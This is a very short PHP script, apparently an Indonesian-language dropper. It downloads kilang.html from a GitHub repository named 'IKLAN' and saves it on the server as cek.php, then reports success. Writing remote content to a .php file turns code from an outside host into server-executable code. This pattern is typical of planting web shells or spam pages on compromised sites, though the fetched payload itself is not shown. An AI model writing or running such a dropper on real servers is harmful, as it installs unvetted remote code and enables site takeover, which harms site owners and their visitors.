<?php
$content = file_get_contents('https://raw.githubusercontent.com/purwocode/IKLAN/main/kilang.html');
file_put_contents('cek.php', $content);
echo "File berhasil disimpan.";
?>
